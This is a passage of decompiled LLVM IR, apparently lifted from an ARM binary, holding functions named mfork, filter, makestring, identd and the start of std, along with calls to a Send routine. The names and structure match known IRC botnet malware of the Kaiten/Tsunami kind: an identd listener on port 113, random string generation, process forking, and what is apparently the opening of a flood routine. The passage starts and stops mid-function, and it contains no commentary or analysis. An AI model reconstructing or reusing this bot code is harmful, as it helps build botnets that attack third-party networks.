  store i32 %arg2, i32* %stack_var_-32, align 4
  store i32 %arg2, i32* @r0, align 4
  %v1_86c8 = call i32 @inet_addr(i32 %arg2)
  store i32 %v1_86c8, i32* @global_var_23868.32, align 4
  %v3_86e0 = icmp eq i32 %v1_86c8, -1
  br i1 %v3_86e0, label %dec_label_pc_86e8, label %dec_label_pc_874c

dec_label_pc_86e8:                                ; preds = %entry
  %v3_86e8 = load i32, i32* %stack_var_-32, align 4
  store i32 %v3_86e8, i32* @r0, align 4
  %v1_86ec = call i32 @__GI_gethostbyname(i32 %v3_86e8)
  %v2_86fc = icmp eq i32 %v1_86ec, 0
  br i1 %v2_86fc, label %dec_label_pc_8704, label %dec_label_pc_8728

dec_label_pc_8704:                                ; preds = %dec_label_pc_86e8
  %v2_8708 = load i32, i32* @global_var_26538.34, align 4
  %v4_871c = call i32 @Send(i32 %v2_8708, i32 ptrtoint ([33 x i8]* @global_var_195b0.36 to i32), i32 %arg1)
  %v1_8724 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8728

dec_label_pc_8728:                                ; preds = %dec_label_pc_86e8, %dec_label_pc_8704
  %v1_872c = add i32 %v1_86ec, 16
  %v2_872c = inttoptr i32 %v1_872c to i32*
  %v3_872c = load i32, i32* %v2_872c, align 4
  %v1_8730 = inttoptr i32 %v3_872c to i32*
  %v2_8730 = load i32, i32* %v1_8730, align 4
  %v1_8738 = add i32 %v1_86ec, 12
  %v2_8738 = inttoptr i32 %v1_8738 to i32*
  %v3_8738 = load i32, i32* %v2_8738, align 4
  store i32 %v3_8738, i32* @r3, align 4
  store i32 %v3_8738, i32* @r2, align 4
  %v3_8748 = call i32 @bcopy(i32 %v2_8730, i32 ptrtoint (i32* @global_var_23868.32 to i32), i32 %v3_8738)
  %v2_8750.pre = load i32, i32* @global_var_23868.32, align 4
  br label %dec_label_pc_874c

dec_label_pc_874c:                                ; preds = %entry, %dec_label_pc_8728
  %v2_8750 = phi i32 [ %v1_86c8, %entry ], [ %v2_8750.pre, %dec_label_pc_8728 ]
  store i32 %v3_86b0, i32* @fp, align 4
  ret i32 %v2_8750

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* @global_var_23868.32, { 0, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_874c, { 1, 0 }
  uselistorder label %dec_label_pc_8728, { 1, 0 }
}

define i32 @mfork(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  %v3_8774 = load i32, i32* @fp, align 4
  store i32 34684, i32* %stack_var_-4, align 4
  %v2_8778 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8778, i32* @fp, align 4
  %v2_8788 = load i8, i8* bitcast (i8** @global_var_23458.38 to i8*), align 4
  %v7_878c = icmp eq i8 %v2_8788, 1
  br i1 %v7_878c, label %dec_label_pc_8794, label %dec_label_pc_87b8

dec_label_pc_8794:                                ; preds = %entry
  %v2_8798 = load i32, i32* @global_var_26538.34, align 4
  %v4_87a8 = call i32 @Send(i32 %v2_8798, i32 ptrtoint ([30 x i8]* @global_var_195d4.41 to i32), i32 %arg1)
  br label %dec_label_pc_88b8

dec_label_pc_87b8:                                ; preds = %entry
  %v0_87b8 = call i32 @__libc_fork()
  %v2_87c8 = icmp eq i32 %v0_87b8, 0
  br i1 %v2_87c8, label %dec_label_pc_87d0, label %dec_label_pc_87dc

dec_label_pc_87d0:                                ; preds = %dec_label_pc_87b8
  br label %dec_label_pc_88b8

dec_label_pc_87dc:                                ; preds = %dec_label_pc_87b8
  %v2_87e0 = load i32, i32* @global_var_23464.43, align 4
  %v1_87e4 = add i32 %v2_87e0, 1
  store i32 %v1_87e4, i32* @global_var_23464.43, align 4
  %tmp = mul i32 %v2_87e0, 4
  %v3_87fc = add i32 %tmp, 8
  %v1_8804 = call i32 @malloc(i32 %v3_87fc)
  %v2_886012 = load i32, i32* @global_var_23464.43, align 4
  %v9_886c14 = icmp eq i32 %v2_886012, 1
  br i1 %v9_886c14, label %dec_label_pc_8874, label %dec_label_pc_881c

dec_label_pc_881c:                                ; preds = %dec_label_pc_87dc, %dec_label_pc_881c
  %storemerge116 = phi i32 [ %v1_8854, %dec_label_pc_881c ], [ 0, %dec_label_pc_87dc ]
  %v3_8820 = mul i32 %storemerge116, 4
  %v2_882c = add i32 %v3_8820, %v1_8804
  %v2_8840 = load i32, i32* @global_var_26550.45, align 4
  %v2_8844 = add i32 %v2_8840, %v3_8820
  %v1_8848 = inttoptr i32 %v2_8844 to i32*
  %v2_8848 = load i32, i32* %v1_8848, align 4
  %v2_884c = inttoptr i32 %v2_882c to i32*
  store i32 %v2_8848, i32* %v2_884c, align 4
  %v1_8854 = add i32 %storemerge116, 1
  %v2_8860 = load i32, i32* @global_var_23464.43, align 4
  %v1_8864 = add i32 %v2_8860, -1
  %tmp25 = icmp ugt i32 %v1_8864, %v1_8854
  br i1 %tmp25, label %dec_label_pc_881c, label %dec_label_pc_885c.dec_label_pc_8874_crit_edge

dec_label_pc_885c.dec_label_pc_8874_crit_edge:    ; preds = %dec_label_pc_881c
  br label %dec_label_pc_8874

dec_label_pc_8874:                                ; preds = %dec_label_pc_87dc, %dec_label_pc_885c.dec_label_pc_8874_crit_edge
  %v2_8860.lcssa = phi i32 [ %v2_8860, %dec_label_pc_885c.dec_label_pc_8874_crit_edge ], [ %v2_886012, %dec_label_pc_87dc ]
  %v1_8878 = add i32 %v1_8804, -4
  %v3_8884 = mul i32 %v2_8860.lcssa, 4
  %v2_8888 = add i32 %v1_8878, %v3_8884
  %v2_8890 = inttoptr i32 %v2_8888 to i32*
  store i32 %v0_87b8, i32* %v2_8890, align 4
  %v2_8898 = load i32, i32* @global_var_26550.45, align 4
  store i32 %v2_8898, i32* @r0, align 4
  %v0_88a0 = call i32 @free()
  store i32 %v1_8804, i32* @global_var_26550.45, align 4
  br label %dec_label_pc_88b8

dec_label_pc_88b8:                                ; preds = %dec_label_pc_87d0, %dec_label_pc_8794, %dec_label_pc_8874
  %v3_88b8 = phi i32 [ 0, %dec_label_pc_87d0 ], [ 1, %dec_label_pc_8794 ], [ %v0_87b8, %dec_label_pc_8874 ]
  store i32 %v3_8774, i32* @fp, align 4
  ret i32 %v3_88b8

; uselistorder directives
  uselistorder i32 %v3_8820, { 1, 0 }
  uselistorder i32 %storemerge116, { 1, 0 }
  uselistorder i32 %v2_886012, { 1, 0 }
  uselistorder i32 %v1_8804, { 1, 2, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_88b8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8874, { 1, 0 }
  uselistorder label %dec_label_pc_881c, { 1, 0 }
}

define i32 @filter(i8* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  %v1_88e0 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_88e0, i32* @ip, align 4
  %v1_891c = add i32 %tmp, -1
  br label %dec_label_pc_8918

dec_label_pc_88f8:                                ; preds = %dec_label_pc_893c, %dec_label_pc_8918
  %v3_8904 = call i32 @strlen(i8* %arg1)
  %v2_890c = add i32 %v1_891c, %v3_8904
  %v3_8914 = inttoptr i32 %v2_890c to i8*
  store i8 0, i8* %v3_8914, align 1
  br label %dec_label_pc_8918

dec_label_pc_8918:                                ; preds = %entry, %dec_label_pc_88f8
  %v3_8924 = call i32 @strlen(i8* %arg1)
  %v2_892c = add i32 %v1_891c, %v3_8924
  %v1_8930 = inttoptr i32 %v2_892c to i8*
  %v2_8930 = load i8, i8* %v1_8930, align 1
  %v7_8934 = icmp eq i8 %v2_8930, 13
  br i1 %v7_8934, label %dec_label_pc_88f8, label %dec_label_pc_893c

dec_label_pc_893c:                                ; preds = %dec_label_pc_8918
  %v3_8948 = call i32 @strlen(i8* %arg1)
  %v2_8950 = add i32 %v1_891c, %v3_8948
  %v1_8954 = inttoptr i32 %v2_8950 to i8*
  %v2_8954 = load i8, i8* %v1_8954, align 1
  %v7_8958 = icmp eq i8 %v2_8954, 10
  br i1 %v7_8958, label %dec_label_pc_88f8, label %dec_label_pc_8960

dec_label_pc_8960:                                ; preds = %dec_label_pc_893c
  ret i32 %v3_8948

; uselistorder directives
  uselistorder i32 %v1_891c, { 1, 2, 0 }
  uselistorder i8* %arg1, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_8918, { 1, 0 }
}

define i32 @makestring(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-1072 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8970 = load i32, i32* @r4, align 4
  %v6_8970 = load i32, i32* @fp, align 4
  store i32 35192, i32* %stack_var_-4, align 4
  %v2_8974 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8974, i32* @fp, align 4
  %v0_8980 = call i32 @rand()
  %v2_8998 = srem i32 %v0_8980, 5
  %v1_89bc = add nsw i32 %v2_8998, 4
  %v1_89c8 = add nsw i32 %v2_8998, 5
  %v1_89d0 = call i32 @malloc(i32 %v1_89c8)
  %v3_89f0 = inttoptr i32 %v1_89d0 to i8*
  %v4_89f0 = call i32 @__GI_memset(i8* %v3_89f0, i32 0, i32 %v1_89c8)
  store i32 ptrtoint ([16 x i8]* @global_var_195f4.48 to i32), i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_19604.50 to i32), i32* @r1, align 4
  %v3_89fc = call i32 @__GI_fopen(i32 ptrtoint ([16 x i8]* @global_var_195f4.48 to i32), i32 ptrtoint (i32* @global_var_19604.50 to i32))
  %v2_8a0c = icmp eq i32 %v3_89fc, 0
  br i1 %v2_8a0c, label %dec_label_pc_8a94.preheader, label %dec_label_pc_8aa8

dec_label_pc_8a94.preheader:                      ; preds = %entry
  %v2_8a9c24 = sub nsw i32 -4, %v2_8998
  %v6_8a9c26 = and i32 %v2_8a9c24, %v1_89bc
  %v7_8a9c27 = icmp slt i32 %v6_8a9c26, 0
  %v8_8a9c28 = icmp slt i32 %v2_8a9c24, 0
  %v2_8aa030 = xor i1 %v8_8a9c28, %v7_8a9c27
  br i1 %v2_8aa030, label %dec_label_pc_8a20, label %dec_label_pc_8bd4

dec_label_pc_8a20:                                ; preds = %dec_label_pc_8a94.preheader, %dec_label_pc_8a20
  %storemerge331 = phi i32 [ %v1_8a8c, %dec_label_pc_8a20 ], [ 0, %dec_label_pc_8a94.preheader ]
  %v2_8a2c = add i32 %storemerge331, %v1_89d0
  store i32 %v2_8a2c, i32* @r4, align 4
  %v0_8a30 = call i32 @rand()
  %v2_8a48 = srem i32 %v0_8a30, 26
  %fold = add nsw i32 %v2_8a48, 65
  %v1_8a84 = trunc i32 %fold to i8
  %v2_8a84 = load i32, i32* @r4, align 4
  %v3_8a84 = inttoptr i32 %v2_8a84 to i8*
  store i8 %v1_8a84, i8* %v3_8a84, align 1
  %v1_8a8c = add i32 %storemerge331, 1
  %v2_8a9c = sub i32 %v1_8a8c, %v1_89bc
  %v4_8a9c = xor i32 %v1_8a8c, %v1_89bc
  %v5_8a9c = xor i32 %v2_8a9c, %v1_8a8c
  %v6_8a9c = and i32 %v5_8a9c, %v4_8a9c
  %v7_8a9c = icmp slt i32 %v6_8a9c, 0
  %v8_8a9c = icmp slt i32 %v2_8a9c, 0
  %v2_8aa0 = xor i1 %v8_8a9c, %v7_8a9c
  br i1 %v2_8aa0, label %dec_label_pc_8a20, label %dec_label_pc_8bd4

dec_label_pc_8aa8:                                ; preds = %entry
  %v0_8aa8 = call i32 @rand()
  store i32 %v0_8aa8, i32* @r4, align 4
  %v0_8ab0 = call i32 @rand()
  %v1_8ab8 = load i32, i32* @r4, align 4
  %v2_8ab8 = mul i32 %v1_8ab8, %v0_8ab0
  %v2_8ad0 = sdiv i32 %v2_8ab8, 12039
  %tmp23 = mul i32 %v2_8ad0, -45402
  %v2_8b0c = add i32 %tmp23, %v2_8ab8
  %v1_8b18 = add i32 %v2_8b0c, 1
  %v2_8b34 = ptrtoint i32* %stack_var_-1072 to i32
  br label %dec_label_pc_8b54

dec_label_pc_8b2c:                                ; preds = %dec_label_pc_8b54
  %v3_8b44 = call i32 @fgets(i32 %v2_8b34, i32 1024, i32 %v3_89fc)
  %v1_8b4c = add i32 %storemerge2, 1
  br label %dec_label_pc_8b54

dec_label_pc_8b54:                                ; preds = %dec_label_pc_8aa8, %dec_label_pc_8b2c
  %storemerge2 = phi i32 [ 0, %dec_label_pc_8aa8 ], [ %v1_8b4c, %dec_label_pc_8b2c ]
  %v2_8b5c = sub i32 %storemerge2, %v1_8b18
  %v4_8b5c = xor i32 %storemerge2, %v1_8b18
  %v5_8b5c = xor i32 %v2_8b5c, %storemerge2
  %v6_8b5c = and i32 %v5_8b5c, %v4_8b5c
  %v7_8b5c = icmp slt i32 %v6_8b5c, 0
  %v8_8b5c = icmp slt i32 %v2_8b5c, 0
  %v2_8b60 = xor i1 %v8_8b5c, %v7_8b5c
  br i1 %v2_8b60, label %dec_label_pc_8b2c, label %dec_label_pc_8b64

dec_label_pc_8b64:                                ; preds = %dec_label_pc_8b54
  %v3_8b7c = bitcast i32* %stack_var_-1072 to i8*
  %v4_8b7c = call i32 @__GI_memset(i8* %v3_8b7c, i32 0, i32 1024)
  %v3_8b98 = call i32 @fgets(i32 %v2_8b34, i32 1024, i32 %v3_89fc)
  %v2_8bac = call i32 @filter(i8* %v3_8b7c)
  store i32 %v1_89bc, i32* @r2, align 4
  store i32 %v2_8b34, i32* @r3, align 4
  store i32 %v1_89d0, i32* @r0, align 4
  store i32 %v2_8b34, i32* @r1, align 4
  %v0_8bc8 = call i32 @memcpy()
  %v1_8bd0 = inttoptr i32 %v3_89fc to i16*
  %v2_8bd0 = call i32 @__GI_fclose(i16* %v1_8bd0)
  br label %dec_label_pc_8bd4

dec_label_pc_8bd4:                                ; preds = %dec_label_pc_8a94.preheader, %dec_label_pc_8a20, %dec_label_pc_8b64
  store i32 %v3_8970, i32* @r4, align 4
  store i32 %v6_8970, i32* @fp, align 4
  ret i32 %v1_89d0

; uselistorder directives
  uselistorder i32 %v2_8b5c, { 1, 0 }
  uselistorder i32 %storemerge2, { 0, 1, 3, 2 }
  uselistorder i32 %v2_8ab8, { 1, 0 }
  uselistorder i32 %v2_8a9c, { 1, 0 }
  uselistorder i32 %v1_8a8c, { 3, 2, 1, 0 }
  uselistorder i32 %v2_8a9c24, { 1, 0 }
  uselistorder i32 %v1_89d0, { 2, 1, 0, 3 }
  uselistorder i32 %v1_89bc, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8998, { 2, 0, 1 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder label %dec_label_pc_8bd4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8b54, { 1, 0 }
  uselistorder label %dec_label_pc_8a20, { 1, 0 }
}

define i32 @"$d.11"(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_8be8:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v0_8be8 = load i1, i1* @cpsr_v, align 1
  br i1 %v0_8be8, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_8be8
  %v1_8be8 = load i32, i32* @r6, align 4
  %v2_8be8 = trunc i32 %v1_8be8 to i8
  %v4_8be8 = inttoptr i32 %v1_8be8 to i8*
  store i8 %v2_8be8, i8* %v4_8be8, align 1
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_8be8, %bb
  %v0_8bec = load i1, i1* @cpsr_z, align 1
  br i1 %v0_8bec, label %bb2, label %.thread

bb2:                                              ; preds = %bb1
  %v1_8bec = load i32, i32* @sb, align 4
  %v3_8bec = load i32, i32* %r1.global-to-local, align 4
  %v4_8bec = inttoptr i32 %v3_8bec to i32*
  store i32 %v1_8bec, i32* %v4_8bec, align 4
  %v5_8bec = load i32, i32* @r4, align 4
  %v6_8bec = load i32, i32* %r1.global-to-local, align 4
  %v7_8bec = sub i32 %v6_8bec, %v5_8bec
  store i32 %v7_8bec, i32* %r1.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %bb1, %bb2
  %v0_8bf8 = load i1, i1* @cpsr_n, align 1
  %v1_8bf8 = load i1, i1* @cpsr_v, align 1
  %v2_8bf8 = xor i1 %v0_8bf8, %v1_8bf8
  br i1 %v2_8bf8, label %bb3, label %bb4

bb3:                                              ; preds = %.thread
  %v4_8bf8 = inttoptr i32 %arg3 to i32*
  store i32 %arg1, i32* %v4_8bf8, align 4
  %v6_8bf8 = add i32 %arg3, 4
  %v7_8bf8 = inttoptr i32 %v6_8bf8 to i32*
  %v8_8bf8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v8_8bf8, i32* %v7_8bf8, align 4
  %v9_8bf8 = add i32 %arg3, 8
  %v10_8bf8 = inttoptr i32 %v9_8bf8 to i32*
  store i32 %arg3, i32* %v10_8bf8, align 4
  %v12_8bf8 = add i32 %arg3, 12
  %v13_8bf8 = inttoptr i32 %v12_8bf8 to i32*
  %v14_8bf8 = load i32, i32* @r4, align 4
  store i32 %v14_8bf8, i32* %v13_8bf8, align 4
  %v15_8bf8 = add i32 %arg3, 16
  %v16_8bf8 = inttoptr i32 %v15_8bf8 to i32*
  %v17_8bf8 = load i32, i32* @r5, align 4
  store i32 %v17_8bf8, i32* %v16_8bf8, align 4
  %v18_8bf8 = add i32 %arg3, 20
  %v19_8bf8 = inttoptr i32 %v18_8bf8 to i32*
  %v20_8bf8 = load i32, i32* @r6, align 4
  store i32 %v20_8bf8, i32* %v19_8bf8, align 4
  %v21_8bf8 = add i32 %arg3, 24
  %v22_8bf8 = inttoptr i32 %v21_8bf8 to i32*
  %v23_8bf8 = load i32, i32* @r8, align 4
  store i32 %v23_8bf8, i32* %v22_8bf8, align 4
  %v24_8bf8 = add i32 %arg3, 28
  %v25_8bf8 = inttoptr i32 %v24_8bf8 to i32*
  %v26_8bf8 = load i32, i32* @ip, align 4
  store i32 %v26_8bf8, i32* %v25_8bf8, align 4
  %v27_8bf8 = add i32 %arg3, 32
  %v28_8bf8 = inttoptr i32 %v27_8bf8 to i32*
  %v29_8bf8 = load i32, i32* @lr, align 4
  store i32 %v29_8bf8, i32* %v28_8bf8, align 4
  br label %bb4

bb4:                                              ; preds = %.thread, %bb3
  ret i32 %arg1

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 1, 0, 2 }
  uselistorder i32 %arg3, { 9, 8, 7, 6, 5, 4, 0, 3, 2, 1 }
  uselistorder label %bb4, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @identd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-1100 = alloca i32, align 4
  %stack_var_-1108 = alloca i32, align 4
  %stack_var_-1236 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_8c00 = load i32, i32* @fp, align 4
  store i32 %v3_8c00, i32* %stack_var_-16, align 4
  store i32 35848, i32* %stack_var_-4, align 4
  %v13_8c00 = ptrtoint i32* %stack_var_-16 to i32
  %v2_8c04 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8c04, i32* @fp, align 4
  %v3_8c18 = call i32 @socket(i32 2, i32 1, i32 0)
  %v7_8c28 = icmp eq i32 %v3_8c18, -1
  br i1 %v7_8c28, label %dec_label_pc_8fb8, label %dec_label_pc_8c30

dec_label_pc_8c30:                                ; preds = %entry
  store i32 2, i32* %stack_var_-60, align 4
  %v1_8c3c = call i32 @__GI_htons(i32 113)
  %v3_8c64 = bitcast i32* %stack_var_-52 to i8*
  %v4_8c64 = call i32 @__GI_memset(i8* %v3_8c64, i32 0, i32 8)
  %v2_8c68 = ptrtoint i32* %stack_var_-60 to i32
  %v4_8c78 = call i32 @bind(i32 %v3_8c18, i32 %v2_8c68, i32 16, i32 %v2_8c68)
  %v7_8c80 = icmp eq i32 %v4_8c78, -1
  br i1 %v7_8c80, label %dec_label_pc_8fb8, label %dec_label_pc_8c88

dec_label_pc_8c88:                                ; preds = %dec_label_pc_8c30
  %v2_8c90 = call i32 @listen(i32 %v3_8c18, i32 1)
  %v7_8c98 = icmp eq i32 %v2_8c90, -1
  br i1 %v7_8c98, label %dec_label_pc_8fb8, label %dec_label_pc_8ca0

dec_label_pc_8ca0:                                ; preds = %dec_label_pc_8c88
  %v0_8ca0 = call i32 @__libc_fork()
  %v2_8ca8 = icmp eq i32 %v0_8ca0, 0
  br i1 %v2_8ca8, label %dec_label_pc_8fb8, label %dec_label_pc_8cb0

dec_label_pc_8cb0:                                ; preds = %dec_label_pc_8ca0
  store i32 16, i32* %stack_var_-44, align 4
  %v2_8cb8 = ptrtoint i32* %stack_var_-76 to i32
  %v2_8cbc = ptrtoint i32* %stack_var_-44 to i32
  %v5_8cc8 = call i32 @__libc_accept(i32 %v3_8c18, i32 %v2_8cb8, i32 %v2_8cbc, i32 %v2_8cb8, i32 16)
  %v2_8cd8 = add i32 %v5_8cc8, 1
  %v3_8cd8 = icmp eq i32 %v5_8cc8, -1
  br i1 %v3_8cd8, label %dec_label_pc_8ce0, label %dec_label_pc_8ce8.preheader

dec_label_pc_8ce0:                                ; preds = %dec_label_pc_8cb0
  %v1_8ce4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8ce8.preheader

dec_label_pc_8ce8.preheader:                      ; preds = %dec_label_pc_8ce0, %dec_label_pc_8cb0
  %v2_8cf0 = ptrtoint i32* %stack_var_-1236 to i32
  %v3_8d30 = udiv i32 %v5_8cc8, 32
  %v3_8d44 = mul nuw nsw i32 %v3_8d30, 4
  %v2_8d4c = add i32 %v3_8d44, %v13_8c00
  %v1_8d5c = urem i32 %v5_8cc8, 32
  %v6_8d64 = shl i32 1, %v1_8d5c
  %v2_8db4 = ptrtoint i32* %stack_var_-1108 to i32
  %v2_8e00 = add i32 %v2_8d4c, -1220
  %v1_8e04 = inttoptr i32 %v2_8e00 to i32*
  br label %dec_label_pc_8d04.lr.ph

dec_label_pc_8d04.lr.ph:                          ; preds = %dec_label_pc_8de4, %dec_label_pc_8ce8.preheader
  br label %dec_label_pc_8d04

dec_label_pc_8d04:                                ; preds = %dec_label_pc_8d04.lr.ph, %dec_label_pc_8d04
  %storemerge26 = phi i32 [ 0, %dec_label_pc_8d04.lr.ph ], [ %v1_8d18, %dec_label_pc_8d04 ]
  %v5_8d10 = mul nuw nsw i32 %storemerge26, 4
  %v6_8d10 = add i32 %v5_8d10, %v2_8cf0
  %v7_8d10 = inttoptr i32 %v6_8d10 to i32*
  store i32 0, i32* %v7_8d10, align 4
  %v1_8d18 = add nuw nsw i32 %storemerge26, 1
  %tmp33 = icmp ult i32 %v1_8d18, 32
  br i1 %tmp33, label %dec_label_pc_8d04, label %dec_label_pc_8d2c

dec_label_pc_8d2c:                                ; preds = %dec_label_pc_8d04
  %v2_8d54 = load i32, i32* %v1_8e04, align 4
  %v2_8d68 = or i32 %v2_8d54, %v6_8d64
  store i32 %v2_8d68, i32* %v1_8e04, align 4
  store i32 60, i32* %stack_var_-1108, align 4
  %v5_8dcc = call i32 @__libc_select(i32 %v2_8cd8, i32 %v2_8cf0, i32 0, i32 0, i32 %v2_8db4)
  %v1_8dd4 = icmp slt i32 %v5_8dcc, 0
  br i1 %v1_8dd4, label %dec_label_pc_8ddc, label %dec_label_pc_8de4

dec_label_pc_8ddc:                                ; preds = %dec_label_pc_8d2c
  %v1_8de0 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8de4

dec_label_pc_8de4:                                ; preds = %dec_label_pc_8d2c, %dec_label_pc_8ddc
  %v2_8e04 = load i32, i32* %v1_8e04, align 4
  %v6_8e101 = lshr i32 %v2_8e04, %v1_8d5c
  %v1_8e18 = urem i32 %v6_8e101, 2
  %v2_8e1c = icmp eq i32 %v1_8e18, 0
  br i1 %v2_8e1c, label %dec_label_pc_8d04.lr.ph, label %dec_label_pc_8e28

dec_label_pc_8e28:                                ; preds = %dec_label_pc_8de4
  %v2_8e30 = ptrtoint i32* %stack_var_-1100 to i32
  %v4_8e44 = call i32 @__libc_recv(i32 %v5_8cc8, i32 %v2_8e30, i32 1024, i32 0)
  %tmp34 = icmp slt i32 %v4_8e44, 1
  br i1 %tmp34, label %dec_label_pc_8e68, label %dec_label_pc_8e5c

dec_label_pc_8e5c:                                ; preds = %dec_label_pc_8e28
  %v7_8e64 = icmp slt i32 %v4_8e44, 20
  br i1 %v7_8e64, label %dec_label_pc_8e70, label %dec_label_pc_8e68

dec_label_pc_8e68:                                ; preds = %dec_label_pc_8e5c, %dec_label_pc_8e28
  %v1_8e6c = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8e70

dec_label_pc_8e70:                                ; preds = %dec_label_pc_8e5c, %dec_label_pc_8e68
  %v2_8e80 = add i32 %v13_8c00, -1084
  %v2_8e84 = add i32 %v2_8e80, %v4_8e44
  %v3_8e8c = inttoptr i32 %v2_8e84 to i8*
  store i8 0, i8* %v3_8e8c, align 1
  %v1_8e94 = add i32 %v13_8c00, -1
  %v2_8ea4 = add i32 %v1_8e94, %v4_8e44
  %v2_8ea8 = add i32 %v2_8ea4, -1084
  %v1_8eac = inttoptr i32 %v2_8ea8 to i8*
  %v2_8eac = load i8, i8* %v1_8eac, align 1
  %v7_8eb0 = icmp eq i8 %v2_8eac, 10
  br i1 %v7_8eb0, label %dec_label_pc_8ee0, label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8e70
  %v2_8ed4 = load i8, i8* %v1_8eac, align 1
  %v7_8ed8 = icmp eq i8 %v2_8ed4, 13
  br i1 %v7_8ed8, label %dec_label_pc_8ee0, label %dec_label_pc_8f04

dec_label_pc_8ee0:                                ; preds = %dec_label_pc_8eb8, %dec_label_pc_8e70
  store i8 0, i8* %v1_8eac, align 1
  br label %dec_label_pc_8f04

dec_label_pc_8f04:                                ; preds = %dec_label_pc_8eb8, %dec_label_pc_8ee0
  %v1_8f08 = add i32 %v13_8c00, -2
  %v2_8f18 = add i32 %v1_8f08, %v4_8e44
  %v2_8f1c = add i32 %v2_8f18, -1084
  %v1_8f20 = inttoptr i32 %v2_8f1c to i8*
  %v2_8f20 = load i8, i8* %v1_8f20, align 1
  %v7_8f24 = icmp eq i8 %v2_8f20, 10
  br i1 %v7_8f24, label %dec_label_pc_8f54, label %dec_label_pc_8f2c

dec_label_pc_8f2c:                                ; preds = %dec_label_pc_8f04
  %v2_8f48 = load i8, i8* %v1_8f20, align 1
  %v7_8f4c = icmp eq i8 %v2_8f48, 13
  br i1 %v7_8f4c, label %dec_label_pc_8f54, label %dec_label_pc_8f78

dec_label_pc_8f54:                                ; preds = %dec_label_pc_8f2c, %dec_label_pc_8f04
  store i8 0, i8* %v1_8f20, align 1
  br label %dec_label_pc_8f78

dec_label_pc_8f78:                                ; preds = %dec_label_pc_8f2c, %dec_label_pc_8f54
  %v4_8f9c = call i32 @Send(i32 %v5_8cc8, i32 ptrtoint ([25 x i8]* @global_var_19608.56 to i32), i32 %v2_8e30)
  %v1_8fa4 = call i32 @__GI___libc_close(i32 %v5_8cc8)
  %v1_8fac = call i32 @__GI___libc_close(i32 %v3_8c18)
  %v1_8fb4 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_8fb8

dec_label_pc_8fb8:                                ; preds = %entry, %dec_label_pc_8ca0, %dec_label_pc_8c88, %dec_label_pc_8c30, %dec_label_pc_8f78
  %v1_8fc0 = phi i32 [ %v3_8c18, %entry ], [ 0, %dec_label_pc_8ca0 ], [ %v2_8c90, %dec_label_pc_8c88 ], [ %v4_8c78, %dec_label_pc_8c30 ], [ %v1_8fb4, %dec_label_pc_8f78 ]
  ret i32 %v1_8fc0

; uselistorder directives
  uselistorder i8* %v1_8f20, { 1, 0, 2 }
  uselistorder i8* %v1_8eac, { 1, 0, 2 }
  uselistorder i32 %storemerge26, { 1, 0 }
  uselistorder i32* %v1_8e04, { 2, 0, 1 }
  uselistorder i32 %v1_8d5c, { 1, 0 }
  uselistorder i32 %v2_8cf0, { 1, 0 }
  uselistorder i32 %v5_8cc8, { 2, 3, 4, 1, 0, 6, 5 }
  uselistorder i32 %v2_8c90, { 1, 0 }
  uselistorder i32 %v4_8c78, { 1, 0 }
  uselistorder i32 %v3_8c18, { 1, 2, 3, 4, 5, 0 }
  uselistorder i32 %v13_8c00, { 0, 1, 3, 2 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0 }
  uselistorder i32 -1084, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8fb8, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_8f78, { 1, 0 }
  uselistorder label %dec_label_pc_8f04, { 1, 0 }
  uselistorder label %dec_label_pc_8e70, { 1, 0 }
  uselistorder label %dec_label_pc_8de4, { 1, 0 }
  uselistorder label %dec_label_pc_8d04, { 1, 0 }
}

define i32 @std(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  store i32 36824, i32* %stack_var_-4, align 4
